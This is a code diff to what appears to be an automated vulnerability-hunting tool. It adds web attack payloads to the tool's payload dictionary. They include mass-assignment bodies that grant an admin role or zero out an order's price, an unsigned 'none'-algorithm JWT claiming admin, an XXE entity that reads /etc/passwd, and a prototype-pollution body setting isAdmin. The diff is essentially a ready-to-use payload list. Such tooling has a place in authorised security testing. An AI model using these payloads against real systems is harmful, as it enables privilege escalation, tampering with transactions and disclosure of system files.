@@ -585,6 +585,20 @@ class ConcurrentHuntRunner:
             "race_condition": [
                 {"payload": "1", "note": "Send 10 concurrent requests"},
             ],
+            "mass_assignment": [
+                {"payload": '{"role":"admin","is_admin":true}', "method": "POST", "param": "user"},
+                {"payload": '{"price":0,"discount":100}', "method": "POST", "param": "order"},
+            ],
+            "jwt": [
+                {"payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.", "header": "Authorization: Bearer"},
+                {"payload": "none", "header": "Authorization: Bearer"},
+            ],
+            "xxe": [
+                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "method": "POST"},
+            ],
+            "prototype_pollution": [
+                {"payload": '{"__proto__": {"isAdmin": true}}', "method": "POST"},
+            ],
             "deserialization": [
                 {"payload": "rO0ABXNy...", "method": "POST"},
             ],
